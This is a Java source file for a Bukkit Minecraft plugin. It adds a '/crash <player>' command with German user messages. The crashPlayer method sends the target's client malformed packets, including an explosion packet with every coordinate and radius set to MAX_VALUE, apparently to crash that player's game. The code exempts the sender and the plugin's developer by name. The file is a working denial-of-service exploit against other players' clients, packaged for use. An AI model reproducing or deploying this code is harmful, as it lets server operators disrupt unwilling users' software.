package com.karatek.core.commands;

/*
 * Command_Crash
 *
 * Version 0.2.2 RC 2
 *
 * Last Change: 0.2.2 RC 2
 *
 * Copyright Karatek_HD
 *
 * License free
 */

import java.util.Collections;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.craftbukkit.v1_8_R1.entity.CraftPlayer;
import org.bukkit.entity.Player;

import com.karatek.core.main.Main;

import net.minecraft.server.v1_8_R1.EntityPlayer;
import net.minecraft.server.v1_8_R1.Packet;
import net.minecraft.server.v1_8_R1.PacketPlayOutExplosion;
import net.minecraft.server.v1_8_R1.PacketPlayOutSpawnEntityLiving;
import net.minecraft.server.v1_8_R1.Vec3D;

public class Command_Crash implements CommandExecutor {

    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {

        //Get the player who executed the command
        Player p =(Player) sender;

        //check the players permission
        if(!p.hasPermission("karatek.crash")){
            p.sendMessage(Main.pre + " Dir fehlt die Berrechtigung §akaratek.crash§r.");
        } else {
            //check syntax
            if(args.length == 0) {
                p.sendMessage("§cVerwendung: /crash <Spieler>");
            } else if(args.length == 1) {
                Player target = Bukkit.getServer().getPlayer(args[0]);
                //check if player target is online
                if(target == null){
                    p.sendMessage("Der Spieler" + args[0] + " ist nicht online!");

                } else if(target.getName().equalsIgnoreCase(p.getName())){
                    //prevent sender from crashing himself
                    p.sendMessage("§CDu willst dich doch nicht selber crashen oder?");
                } else if(target.getName().equalsIgnoreCase("Karatek_HD")){
                    //prevent sender from crashing the developer of this plugin
                    p.sendMessage("§CDu darfst diesen Spieler nicht crashen!");
                }
                else {
                    //crash Player
                    crashPlayer(p, target);
                }
            } else {
                //send help
                p.sendMessage("§CVerwendung: /crash <Spieler>");
            }
        }
        return false;
    }

    public void crashPlayer(Player sender, Player target) {
        //get target player and name
        final String name = target.getName();
        final String dpn = target.getDisplayName();
        //create packet 1
        EntityPlayer nmsPlayer = ((CraftPlayer) target).getHandle();
        PacketPlayOutSpawnEntityLiving packet = new PacketPlayOutSpawnEntityLiving(nmsPlayer);
        //send packet 1
        nmsPlayer.playerConnection.sendPacket(packet);
        //create and send packet 2
        ((CraftPlayer) target).getHandle().playerConnection.sendPacket((Packet) new PacketPlayOutExplosion(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE, Collections.emptyList(), new Vec3D(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE)));
        //Send messages
        sender.sendMessage("§rDu hast den Spieler §e" + dpn + " §rgecrashed.");
        System.out.println("Der Spieler " + sender.getName() + "hat den Spieler " + name + "gecrasht.");
    }



}